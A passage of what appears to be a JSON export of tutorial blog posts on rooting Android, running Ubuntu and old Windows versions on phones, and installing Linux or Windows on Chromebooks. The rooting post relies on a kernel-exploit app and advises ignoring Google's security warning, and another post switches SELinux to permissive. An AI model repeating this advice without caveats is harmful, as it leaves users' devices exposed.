debugging./span\r\n\r\n\r\n\r\nStep 2: Downloading the Image\r\n\r\nspan style=\"color: 000000;\"Now go back to Complete Linux installer on Page 2. Select the button that says Download Image. It will ask you to choose the image size that you want to download.  If you want complete customization and prefer interacting with Linux via the terminal then I recommend that you download the core image.  Else, you should download the full image (Large Image).  I also suggest that you choose the option to download the image via sourceforge.  /span\r\n\r\n\r\n\r\nStep 3: Extracting the Image\r\n\r\nspan style=\"color: 2a1e1e;\"Once the image has finished downloading, you will need to extract it.  To do this, navigate to your downloads folder via your favorite file browser and extract the contents.  You should end up with two items. Ubuntu.13.10~&#8230;img and Ubuntu.13.10~&#8230;.img.md5./span\r\n\r\n\r\n\r\nStep 4: Make Ubuntu Folder\r\n\r\nspan style=\"color: 2a1e1e;\"After extracting the contents, you will need to make a folder at the root of your sdcard directory and call it /spanstrong style=\"color: #2a1e1e;\"ubuntu./strongspan style=\"color: #2a1e1e;\"  Transfer the files you extracted to this folder./span\r\n\r\n\r\n\r\nStep 5: Changing Files\r\n\r\nspan style=\"color: 2a1e1e;\"Finally, change the file name of the .img to /spanstrong style=\"color: #2a1e1e;\"Ubuntu.img/strongspan style=\"color: #2a1e1e;\" and the .img.md5 file to /spanstrong style=\"color: #2a1e1e;\" Ubuntu.img.md5./strong\r\n\r\n\r\n\r\nStep 6: Changing SE Linux Mode (Kitkat Only)\r\n\r\nspan style=\"color: 2a1e1e;\"If you&#8217;re running android 4.4 or above, the extra security measures will interfere with your ability to boot Ubuntu.  So open the SE Linux Mode changer app that you downloaded earlier and select /spanstrong style=\"color: #2a1e1e;\"permissive./strongspan style=\"color: #2a1e1e;\"  (Don&#8217;t forget to change this back once you&#8217;re done using Ubuntu)/span\r\n\r\n\r\n\r\nStep 7: Starting Ubuntu\r\n\r\nspan style=\"color: 2a1e1e;\"Now go back into Complete Linux Installer and in the sidebar select the launch button.  Change the distribution to Ubuntu and hit the &#8220;emstart linux/em&#8221; button./span\r\n\r\n\r\n\r\nStep 8: Booting into Ubuntu\r\n\r\nspan style=\"color: 2a1e1e;\"Terminal Emulator will open and it will begin to run the script to boot Ubuntu.  It will ask you whether you want to start the /spanstrong style=\"color: #2a1e1e;\"vnc server.  Type Y then hit enter./strongspan style=\"color: #2a1e1e;\"  Then it will ask whether you would like to start a SSH server, you can type n for no.  Finally, it&#8217;ll ask you to enter your desired resolution.  Since I&#8217;m using the Nexus 7 (2013), I typed in 1920&#215;1080, but of course your device might be different.  Finally, if you see /spanstrong style=\"color: #2a1e1e;\"root@localhost/strongspan style=\"color: #2a1e1e;\" then you have successfully booted Ubuntu./span\r\n\r\n\r\n\r\nStep 9: Accessing the GUI\r\n\r\nspan style=\"color: 2a1e1e;\"The final step is to get to the actual GUI. To access the GUI launch Android VNC Viewer.  In the nickname field you can enter whatever you want. The password is /spanstrong style=\"color: #2a1e1e;\"ubuntu./strongspan style=\"color: #2a1e1e;\"  You can keep the address field blank or type in /spanstrong style=\"color: #2a1e1e;\"localhost/strongspan style=\"color: #2a1e1e;\".  The port is /spanstrong style=\"color: #2a1e1e;\"5900.  /strongspan style=\"color: #2a1e1e;\"(In some rare cases, your port might be 5901 or even 5902).  Finally, change the color format to 24bit (4 bpp).  Then hit connect. If all goes well, you should be looking at the Ubuntu KDE desktop.  Of course you&#8217;re free to change it to something more eye-catching such as gnome. In addition,  if you have a USB OTG Adapter you can connect an external keyboard and mouse for the extra convenience. /span\r\n\r\n\r\n\r\n{{ youtube b17Bfza1X3A }}\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n[1]: http://www.davebennett.tv/wp-content/uploads/2014/07/ubuntu-13.10-on-android.jpg\r\n[2]: http://www.davebennett.tv/wp-content/uploads/2014/07/l1.jpg\r\n[3]: http://www.davebennett.tv/wp-content/uploads/2014/07/l11.jpg\r\n[4]: http://www.davebennett.tv/wp-content/uploads/2014/07/l5.jpg\r\n[5]: http://www.davebennett.tv/wp-content/uploads/2014/07/l4.jpg\r\n[6]: http://www.davebennett.tv/wp-content/uploads/2014/07/l6.jpg\r\n[7]: http://www.davebennett.tv/wp-content/uploads/2014/07/l9.jpg\r\n[8]: http://www.davebennett.tv/wp-content/uploads/2014/07/l10.jpg\r\n[9]: http://www.davebennett.tv/wp-content/uploads/2014/07/permissive.jpg\r\n[10]: http://www.davebennett.tv/wp-content/uploads/2014/07/l12.jpg\r\n[11]: http://www.davebennett.tv/wp-content/uploads/2014/07/l15.jpg\r\n[12]: http://www.davebennett.tv/wp-content/uploads/2014/07/l18.jpg\r\n[13]: http://www.davebennett.tv/wp-content/uploads/2014/07/l17.jpg\r\n[14]: http://www.davebennett.tv/wp-content/uploads/2014/07/l16.jpg\r\n",
        "tags": [
            "android",
            "complete linux installer",
            "debian",
            "easy way",
            "emulate",
            "galaxy",
            "gui",
            "how",
            "htc",
            "install",
            "linux",
            "nexus",
            "opensourcegangster",
            "run",
            "smartphone",
            "software",
            "tablet",
            "terminal",
            "to",
            "ubuntu"
        ]
    },
    {
        "uri": "/share-computer-internet-connection-with-android-reverse-tethering/",
        "title": "Android Reverse Tether",
        "content": "{{ youtube _pmoYJrTgnM }}\r\n\r\nspan style=\"color: #2a1e1e;\"Everyone is familiar with tethering.  However, many people overlook the ability to reverse tether.  Reverse tethering allows you to share your computer&#8217;s internet connection with your phone or tablet.  This is useful if you&#8217;re on a metered data plan or in an area which has no wifi and a weak mobile signal. /span\r\n\r\nWhat You Will Need:\r\n\r\n  A rooted Android Device\r\n  A Windows PC\r\n  a href=\"http://forum.xda-developers.com/attachment.php?attachmentid=1489874&d=1353190196\" target=\"_blank\"USB Driver/a\r\n  Reverse Tether Zip (Go to a href=\"http://forum.xda-developers.com/showthread.php?t=1371345\" target=\"blank\"this thread/a to download or direct download a href=\"http://forum.xda-developers.com/attachment.php?attachmentid=2510470&d=1389514730\" target=\"blank\"here/a)\r\n\r\n Step 1: Install USB Drivers\r\n\r\nspan style=\"color: #2a1e1e;\"If you don&#8217;t have any device drivers already installed on your computer and you never used adb before, then you will need to install the USB drivers.  I provided a link above to the driver and /spana style=\"color: #e5562e;\" href=\"http://forum.xda-developers.com/showthread.php?t=1161769\" target=\"_blank\"here/aspan style=\"color: #2a1e1e;\" are instructions on how to install it./span\r\n\r\nStep 2: Enable USB Debugging\r\n\r\nspan style=\"color: 2a1e1e;\"To enable USB debugging go to your settings menu, then developer options, and enable usbDebugging.  If you don&#8217;t see developer options, go to /spanem id=\"yui3_1721_1404139973977703\" style=\"color: #2a1e1e;\"about phone/emspan style=\"color: #2a1e1e;\" and tap the/spanem style=\"color: #2a1e1e;\" /embuild number 10span style=\"color: #2a1e1e;\" times.  It should prompt you that &#8220;You are now a developer&#8221; and from there you should see developer options. Now connect your phone to you PC. /span\r\n\r\n\r\n\r\nStep 3: Launching Android Tool\r\n\r\nspan style=\"color: 2a1e1e;\"Download and Extract the Reverse Tether.zip. Launch the emAndroidTool app/em with administrative privileges (if possible)./span\r\n\r\n\r\n\r\nStep 4: Connecting To Your Device\r\n\r\nspan style=\"color: 2a1e1e;\"Once the application opens, make sure that a device serial number is displayed along with an IP address. Make sure to choose a DNS; I used Google&#8217;s DNS (8.8.8.8). Once you are ready, click connect. The program will automatically install an Android client app to your device. In the process it will ask for superuser permission./span\r\n\r\n\r\n\r\nStep 5: Establishing The Connection\r\n\r\nspan style=\"color: 2a1e1e;\"On your device, the client  app should launch and you should see green check marks on the program indicating that the service launched successfully.  And that&#8217;s it, you now have internet on your device via your PC&#8217;s connection! There you have it, Android reverse tether./span\r\n  \r\n\r\n\r\n&nbsp;\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/06/Screenshot_2014-07-06-23-19-41.png\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/06/run-as-admin.jpg\r\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/06/reverse-tether.png\r\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/06/Screenshot_2014-07-06-23-06-05.png\r\n",
        "tags": [
            "android",
            "computer",
            "droid",
            "galaxy",
            "internet",
            "lg",
            "nexus",
            "pc",
            "phone",
            "reverse",
            "root",
            "share",
            "smartphone",
            "tablet",
            "tether",
            "with"
        ]
    },
    {
        "uri": "/how-to-root-any-android-device-2014/",
        "title": "How to Root Any Android Device",
        "content": "\r\n\r\nThere are some things in life that sound too good to be true. However, this isn&#8217;t one of them.  George Hortz, a hacker made famous by his iOS jailbreaks and PlayStation hacks has managed to root the Verizon Galaxy S5. So why should you care? Well, he used a recently discovered exploit found in all Linux kernels that were built prior to June 3rd. So in theory (and in practice) his app should work on any Android device that has a kernel build date prior to June 3rd. Now, this isn&#8217;t going to work on newer HTC or Motorola devices because of a locked system partition (damn you HTC and Motorola) but it should work with almost any other device. For more details check out the thread a href=\"http://forum.xda-developers.com/showthread.php?t=2783157\" target=\"_blank\"here/a. So here&#8217;s how to root any android device:\r\n\r\nWhat You Will Need:\r\n\r\n  An Android Device\r\n  a href=\"https://towelroot.com/\" target=\"_blank\"Towel Root APK/a\r\n\r\nStep 1: Make Sure Your Device is Compatible\r\n\r\nThe kernel build date on your device has to be before June 3rd.  To check your kernel build number go to settings &8211; about phone. Then look at the build date.\r\n\r\n\r\n\r\n Step 2: Rooting\r\n\r\nNow time to root.  Navigate to the site listed above (towelroot.com) and click on the lamba sign to down the apk. When installing it you might get a warning about Google saying that it could open up exploits and cause harm (well, no duh&#8230;we&#8217;re rooting) just ignore and continue. Once the installation completes, open up the app and hit the Make it Rain button. It will reboot your device and you will be rooted. To verify that you&#8217;re rooted, use the app a href=\"https://play.google.com/store/apps/details?id=com.joeykrim.rootcheck\" target=\"blank\"root checker/a. You are going to have to download a Superuser manager though, so I recommend downloading a href=\"https://play.google.com/store/apps/details?id=eu.chainfire.supersu\" target=\"blank\"SuperSU/a.\r\n\r\nIf the website says that your device is unsupported, it might just be because it&#8217;s not in the database. Use Modstrings to fix that: a href=\"https://towelroot.com/modstrings.html\" target=\"_blank\"https://towelroot.com/modstrings.html/a\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n{{ youtube vbeVZHF563o }}\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/website-root-any-device.jpg\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-07-09-58-541.png\r\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/Screenshot_2014-07-07-10-02-481.png\r\n",
        "tags": [
            "almost",
            "android",
            "any",
            "application",
            "device",
            "droid",
            "easy",
            "exploit",
            "g3",
            "galaxy",
            "geohot",
            "htc",
            "lg",
            "method",
            "motorola",
            "nexus",
            "note",
            "one click",
            "phone",
            "root",
            "samsung",
            "smartphone",
            "sony",
            "superuse",
            "tablet",
            "towelroot",
            "xperia"
        ]
    },
    {
        "uri": "/intsall-ubuntu-on-chromebook/",
        "title": "Install Ubuntu on Chromebook",
        "content": "\r\n\r\nEveryone has their own opinion of Chrome OS. Some find it extremely useful and others think it&#8217;s complete garbage. While I would consider myself part of the former group, I can admit that there are places where Chrome OS falls short of a desktop operating system. For exampling, I&#8217;m not able to open a java compiler on Chrome OS or use Wine to play Steam games. However, you can do all these things on Linux. Installing Linux or more specifically, Ubuntu, is really easy to do. For this tutorial, I am going to show you how to install Ubuntu using the crouton method. Crouton will run Ubuntu on top of Chrome OS. The advantage with this method is that you can switch back and forth between Chrome OS and Ubuntu with a few clicks. Also, this is easier to install (and uninstall) over dual-booting. Here&#8217;s how to install Ubuntu on Chromebook.\r\n\r\nWhat You Will Need:\r\n\r\n  A Chromebook\r\n  a href=\"http://goo.gl/fd3zc\" target=\"_blank\"Crouton/a (don&8217;t download this now, wait until step 2 )\r\n\r\nStep 1: Developer Mode\r\n\r\nBefore you can install Crouton, you will need to put your chromebook in developer mode. Developer Mode allows you to get root access to the command shell. Be aware that activating developer mode erases all of your information. Of course, due to the nature of Chrome OS, you won&8217;t really have to worry about backing up apps or anything.\r\n\r\nThe instructions for entering developer mode will differ for each chromebook. On the Acer C720, hold the the ESC and* * Refresh (F3) keys and tap the Power button. This will put your chromebook into recovery mode.\r\n\r\n\r\n\r\nOnce you are inside of the recovery, press *Crtl+D *to activate developer mode. Your chromebook will reboot and you will hear two beeps, don&#8217;t panic. After the beeps, your chromebook will reboot again. It will erase your data and reboot you in developer mode.\r\n\r\nWhile developer mode is activated, whenever you reboot your device it will show the recovery screen for 30 seconds before entering into Chrome OS. Just press *Crtl+D *on the recovery screen if you don&#8217;t feel like waiting for 30 seconds.\r\n\r\n\r\n\r\nNow take a few seconds to reconfigure your Google account.\r\n\r\nStep 2: Installing Crouton\r\n\r\nNow it&8217;s time to download the Crouton file onto your chromebook. Keep it in your downloads folder (unless you&#8217;re an organization freak and need it in a subfolder). The only way to install it is through terminal. So press *Crtl+Alt+T *to open the terminal. Then type in *shell *to enter the Linux shell.\r\n\r\nTo install Crouton (with an encrypted chroot, hence the _e_) enter the following:\r\n\r\nspan style=\"color: #222222;\"sudo sh -e ~/Downloads/crouton -t unity/span\r\n\r\nIf you rather have another desktop environment such as unity, then replace unitywith the desktop environment that you want. After you enter the command it will begin to download and install Crouton.  A quick tip from webupd8.org, you can also enter in sh -e ~/Downloads/crouton -r list_ _to see a list of available Ubuntu versions to install.\r\n\r\n\r\n\r\nOnce the installation finishes, type in sudo unity(or startxfce if it applies to you) to start the Ubuntu desktop environment.\r\n\r\n\r\n\r\nOnce inside of Ubuntu, it&#8217;s always good to open up terminal and perform a quick update.\r\n\r\napt-get update\r\n\r\napt-get upgrade\r\n\r\n  {{ youtube 7KGcd9sSQok }}\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3152.jpg\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3142.jpg\r\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3143.jpg\r\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3148.jpg\r\n [5]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3151.jpg\r\n",
        "tags": [
            "acer",
            "along side",
            "alternative",
            "c720",
            "chromebook",
            "chrubuntu",
            "crouton",
            "desktop",
            "dual booting",
            "easy",
            "free",
            "install",
            "install ubuntu on chromebook",
            "internal storage",
            "linux",
            "opensourcegangster",
            "operating system",
            "os",
            "pixel",
            "samsung",
            "series",
            "ubuntu",
            "without wiping"
        ]
    },
    {
        "uri": "/install-windows-8-on-chromebook/",
        "title": "Install Windows 8 on Chromebook",
        "content": "a href=\"http://www.davebennett.tv/install-windows-10-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Windows 8 is old news now, look at running Windows 10 on your Chromebook!/a\n\nSo you want to run Windows 8 on your Chromebook? Well congratulations, you clicked on the right link. Let me first ask you a question. Are you looking for a fully responsive, practical and reliable Windows 8 chromebook system? If so, then go out and buy a Windows netbook. While running Windows 8 on your Chromebook is feasible, there are a lot of driver hurdles and hardware limitations (depending on your Chromebook model) that you will have to overcome before this becomes a practical solution. This (rough) guide will show you how to get everything setup to the point in which you can actually install Windows 8; but because of the limited disk space available on my Chromebook, I couldn&8217;t actually install Windows 8, but more on that later. So here&#8217;s how to install windows 8 on Chromebook:\n\nWhat You Will Need:\n\n  An Intel/AMD powered Chromebook (Sorry, no ARM Chromebook)\n  Windows 8 ISO \n      If you don&8217;t have a windows 8 iso don&#8217;t worry because you can download a free evaluation trial of Windows 8 enterprise right from Microsoft a href=\"http://technet.microsoft.com/en-us/evalcenter/hh699156.aspx\" target=\"_blank\" rel=\"noopener\"here/a.\n\nStep 1: Getting Windows 8 on a USB\n\n{{ ad }}\n\nBefore we can get started, the first thing which needs to be address is how you will get Windows 8 onto your Chromebook. You have two options when it comes to this.\n\n Option 1: Installing Windows 8 from USB\n\nThis is the option which most of you probably are familiar with. You can take a generic USB (preferably 8GB or larger) and use a program such as the *a href=\"http://images2.store.microsoft.com/prod/clustera/framework/w7udt/1.0/en-us/Windows7-USB-DVD-tool.exe\" target=\"_blank\" rel=\"noopener\"Windows 7 USB DVD tool/a *(yes it works with windows 8) and install the Windows 8 setup files to your USB drive. The program will unpack the setup and run the installation on the target machine.\n\nOption 2: Installing Windows 8 to the USB\n\nThis method only works if you&8217;re using a USB 3.0 stick. You can use a program called a href=\"http://www.easyuefi.com/wintousb/\" target=\"_blank\" rel=\"noopener\"strongWinToUSB/strong /athat will install Windows 8 to your USB drive. Essentially, you will be booting and running Windows 8 from your USB. Unfortunately, when I tried this I couldn&#8217;t get passed the Windows 8 loading screen. I figured it was because the read speeds from USB are just too slow. But your mileage may vary.\n\nStep 2: Enabling Developer Mode\n\n{{ ad }}\n\nBefore you can install Windows 8, you will need to put your chromebook in developer mode. Developer Mode allows you to get root access to the command shell. Be aware that activating developer mode erases all of your information. Of course, due to the nature of Chrome OS, you won&8217;t really have to worry about backing up apps or anything.\n\nThe instructions for entering developer mode will differ for each chromebook. On the Acer C720, hold the the ESC and* * Refresh (F3) keys and tap the Power button. This will put your chromebook into recovery mode.\n\nOnce you are inside of the recovery, press *Crtl+D *to activate developer mode. Your chromebook will reboot and you will hear two beeps, don&#8217;t panic. After the beeps, your chromebook will reboot again. It will erase your data and reboot you in developer mode.\n\nWhile developer mode is activated, whenever you reboot your device it will show the recovery screen for 30 seconds before entering into Chrome OS. Just press *Crtl+D *on the recovery screen if you don&#8217;t feel like waiting for 30 seconds. If you haven&#8217;t yet, now is the time to plug in your USB with Windows 8 on it. You&#8217;re going to need it soon.\n\nStep 2: Enabling Legacy Bios\n\nIn order to boot from your USB device, you will need to enable the legacy bios. On the Chrome login screen press Crtl-Alt-F2 to enter the shell window.\n\nOnce you are inside the shell window type in the following: (source https://wiki.archlinux.org/index.php/Acer\\C720\\Chromebook)\n\nprestrongchronos /strong(for the username)\n\nstrongsudo bash /strong(for Superuser privileges)\n\nstrongcrossystem devbootusb=1 devbootlegacy=1/strong\n\nstrongsudo reboot/strong/pre\n\nYour chromebook will reboot. Now, on the OS verification (recovery) screen, hit Crtl-L to bring up the legacy bios, then Esc to bring up the boot menu.\n\n{{ ad }}\n\nFinally, choose your USB device and if everything goes well, Windows 8 should be booting.\n\nIn order to navigate the install menu, you will need to connect an external mouse because there are no trackpad drivers.\n\n&nbsp;\n\nUnfortunately, this is where I must leave you on your own. As I mentioned in the introduction, I lacked the available hard disk space to actually install Windows 8. My Chromebook only has a 16 GB SSD, with only 10 GB available after Chrome OS. In addition, I was having no problem getting to the install screen the previous 3 times I was trying this out. However, on the 4th time around (when I was taking photos for this blog post) for some reason it kept freezing on the setup screen. So hopefully you will have better luck than I had. Definitely try this out and report back how far you were able to go.\n\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/windows-7-usb-download-tool.png\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/WinToUSB.png\n [3]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3142.jpg\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3158.jpg\n [5]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3159.jpg\n [6]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3165.jpg\n [7]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3166.jpg\n",
        "tags": [
            "acer",
            "c720",
            "c720p",
            "chrome os",
            "chromebook",
            "driver",
            "dual boot",
            "easy",
            "install",
            "intel",
            "laptop",
            "mobile",
            "netbook",
            "opensourcegangster",
            "possible",
            "run",
            "samsung",
            "usb",
            "windows",
            "x86"
        ]
    },
    {
        "uri": "/run-windows-95-on-android/",
        "title": "Run Windows 95 on Android",
        "content": "The 90s called, and they want their operating system back. Windows 95 was unique for its time. However, what once took cutting edge hardware to run can now easily operate on a typical Android device. Yes Virginia, you can run Windows 95 on Android.\n\nWhat You Will Need:\n\n  a href=\"http://www.mediafire.com/download/lq32lzpch46mn81/c.img\" target=\"_blank\" rel=\"noopener\"Windows 95 Image File/a\n  a href=\"http://sourceforge.net/projects/limbopcemulator/\" target=\"_blank\" rel=\"noopener\"Limbo PC Emulator/a\n\n Step 1: Download Stuff\n\nIf you have your own bootable image file that you would like to use, feel free to do so. Theoretically, this should work with every Windows operating system up to XP. If not, use the Windows image above. Transfer it to your Android device. Also, download the Limbo PC emulator app. It uses the qemu library (libsdl) but provides more flexibility when handling emulating.\n\n{{ ad }}\n\nStep 2: Setup Limbo PC Emulator\n\nLaunch Limbo PC emulator on your device. Create a new VM, and call it whatever you like. Change the CPU Model to qemu32 and set the ram size to 120 MB. Finally, go to Hard Disk A and select your image file. The hit start.   If all goes well, Windows 95\n\n&nbsp;\n\n&nbsp;\n\n [1]: http://www.davebennett.tech/wp-content/uploads/2014/07/Screenshot_2014-07-11-15-38-051.png\n [2]: http://www.davebennett.tech/wp-content/uploads/2014/07/windows-95-3.jpg\n",
        "tags": [
            "android",
            "dik image",
            "easy",
            "emulate",
            "emulator",
            "iso",
            "limbo",
            "nexus",
            "opensourcegangster",
            "operating system",
            "pc",
            "run",
            "smartphone",
            "tablet",
            "windows",
            "windows 95",
            "xp"
        ]
    },
    {
        "uri": "/windows-xp-android/",
        "title": "Windows XP on Android",
        "content": "{{ youtube auIZtmbPu_Y }}\r\n\r\nYes Virginia, you can run Windows XP on your Android device. What once took cutting edge hardware to boot, can now work on your typical Android smartphone. Don&#8217;t get too excited though, this will not replace your desktop pc any time soon. The emulation speed is unbearably slow, and you lack any sort of network connectivity. So how does this work? One word, Bochs. Bochs is an app that can emulate practically any 32 bit operating system. Bochs was designed to run legacy operating systems such as Windows DOS and Windows 3, definitely not Windows XP. Generally anything higher than Windows 95 becomes a hit or miss as far as usability.  The bottom line is that you&#8217;re about to perform something that might not work on your device, and if it does, it has no practically use to it. Are you excited yet?\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nOkay now that the introduction is out of the way, let&#8217;s get down to business. Of course, you will first need to have a Windows XP iso file. Now, if you&#8217;re crafty enough, you can use a program called Windows builder to decrease it to 100MB in size. This is what I did to get a href=\"http://www.davebennett.tech/windows-xp-on-android-wear-smartwatch/\" target=\"_blank\"Windows XP running on Android wear/a. I am not going to cover that here because it will take too long, but just know that it is also an option. We are going to use Qemu manager to install Windows XP. Unlike virtual box, Qemu is able to better handle raw image files that we can transfer to Bochs on Android. So here&#8217;s how to run Windows XP on Android.\r\n\r\nWhat You Will Need:\r\n\r\n  Windows XP ISO\r\n  a href=\"http://download.cnet.com/Qemu-Manager/3000-20944-75451507.html\" target=\"blank\"Qemu Manager/a\r\n  a href=\"http://forum.xda-developers.com/attachment.php?attachmentid=814993&d=1323778011\" target=\"_blank\"Bochs For Android/a\r\n  a href=\"http://www.mediafire.com/download/2a9khz3amjbm59y/BochsSDL.zip\" target=\"blank\"SDL Zip/a\r\n  a href=\"http://www.mediafire.com/download/rtec86bwwmee00s/BlankDisk.zip\" target=\"blank\"Blank Disk Image/a\r\n\r\n Step 1: Installing Windows XP to Disk Image\r\n\r\nOpen up Qemu manager and create a new virtual machine. Name it whatever you like and click next.\r\n\r\nimg class=\"alignnone size-large wp-image-1477\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/new-virtual-machine-qemu-1024x576.jpg\" alt=\"new virtual machine qemu\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/new-virtual-machine-qemu-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/new-virtual-machine-qemu-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/new-virtual-machine-qemu-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/new-virtual-machine-qemu.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nAllocate it however much ram that you&#8217;re willing to spare. This is only for your pc and has nothing to do with the amount of ram 0n your Android device. Finally, select the option, do not use a virtual disk image. Click finish.\r\n\r\nimg class=\"alignnone size-large wp-image-1476\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Settings-virtual-machine-qemu-1024x576.jpg\" alt=\"Settings virtual machine qemu\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Settings-virtual-machine-qemu-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Settings-virtual-machine-qemu-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Settings-virtual-machine-qemu-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Settings-virtual-machine-qemu.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nNext go to the drives tab and select hard drive 0. Then locate the blank disk image that you downloaded. You might need to make sure that all files are selected in order to see it.\r\n\r\nimg class=\"alignnone size-large wp-image-1475\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Blank-disk-drive-qemu-1024x576.jpg\" alt=\"Blank disk drive qemu\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Blank-disk-drive-qemu-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Blank-disk-drive-qemu-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Blank-disk-drive-qemu-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Blank-disk-drive-qemu.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nNext, select CD ROM and locate your Windows XP ISO file.\r\n\r\nimg class=\"alignnone size-large wp-image-1474\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/CD-rom-drive-qemu-1024x576.jpg\" alt=\"CD rom drive qemu\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/CD-rom-drive-qemu-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/CD-rom-drive-qemu-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/CD-rom-drive-qemu-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/CD-rom-drive-qemu.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nFinally, select the green arrow to start the VM. From this point, just go through the process of installing Windows XP like you would on any normal computer.\r\n\r\nimg class=\"alignnone size-large wp-image-1473\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/windows-xp-setup-1024x576.jpg\" alt=\"windows xp setup\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-setup-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-setup-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-setup-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-setup.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nStep 2: Transferring\r\n\r\nAfter the installation completes, extract the SDL zip. Transfer the blank disk image (that is no longer &8220;blank&#8221; because you just installed Windows XP to it) and put it inside the SDL folder. Rename the blank disk image to c.\r\n\r\nimg class=\"alignnone size-large wp-image-1472\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/sdl-folder-1024x576.jpg\" alt=\"sdl folder\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/sdl-folder-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/sdl-folder-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/sdl-folder-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/sdl-folder.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nThen open up the *bochsrc text file. *Where you see the word &#8220;c.img&#8221; change it to just &#8220;c&#8221;. Save and close it.\r\n\r\nimg class=\"alignnone size-large wp-image-1471\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/boshrc-1024x576.jpg\" alt=\"boshrc\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/boshrc-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/boshrc-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/boshrc-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/boshrc.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nThen transfer that folder to the root of the internal memory (or sdcard) on your Android device.\r\n\r\nStep 3: Booting on Android\r\n\r\nInstall the boch apk to your Android device. Then launch it. It should detect the Windows XP image and boot right into Windows XP. Remember, this is going to be slow! You might have to wait as much as 10 minutes until you actually get to the Windows XP desktop screen.\r\n\r\n img class=\"alignnone size-large wp-image-1470\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Windows-XP-1024x576.jpg\" alt=\"Windows XP on Android\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Windows-XP-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Windows-XP-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Windows-XP-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Windows-XP.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /img class=\"alignnone size-large wp-image-1469\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/windows-xp-desktop-1024x576.jpg\" alt=\"windows xp desktop\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-desktop-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-desktop-300x169.jpg 300w, 